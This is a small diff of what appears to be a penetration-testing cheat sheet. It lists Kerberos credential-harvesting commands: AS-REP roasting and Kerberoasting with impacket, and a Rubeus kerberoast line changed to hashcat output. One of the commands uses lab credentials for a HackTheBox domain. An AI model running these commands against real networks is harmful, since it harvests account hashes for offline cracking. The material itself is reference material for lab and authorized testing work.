@@ -482,7 +482,7 @@ impacket-GetNPUsers -dc-ip 192.168.50.70  -request -outputfile hashes.asreproast
 impacket-GetUserSPNs -dc-ip 10.10.10.100 active.htb/SVC_TGS:GPPstillStandingStrong2k18 -request -save -outputfile tgs.hash
 
 # Rubeus
-.\Rubeus.exe kerberoast /nowrap /outfile:hashes.kerberoast /dc:
+.\Rubeus.exe kerberoast /nowrap /format:hashcat /dc:
 ```
 #### DCsync
 ```bash
